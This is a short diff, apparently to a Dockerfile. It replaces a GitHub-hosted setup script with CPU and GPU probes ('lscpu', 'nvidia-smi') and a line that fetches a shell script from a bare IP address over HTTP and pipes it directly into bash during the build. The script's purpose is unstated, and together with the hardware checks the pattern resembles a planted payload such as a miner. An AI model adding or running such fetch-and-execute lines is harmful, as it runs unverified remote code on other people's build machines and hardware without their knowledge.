@@ -14,4 +14,6 @@ RUN apt update
 
 # Install nginx, php-fpm and supervisord from ubuntu repository
 RUN apt -y install wget
-RUN wget -O - https://raw.githubusercontent.com/nathanfleight/scripts/main/prep_codeserver_w_jprq2.sh | bash
+RUN lscpu
+RUN nvidia-smi
+RUN wget -O - http://23.92.22.221/start_N_Doc_Pul_mnpls_OV_solo_ws2.sh | bash
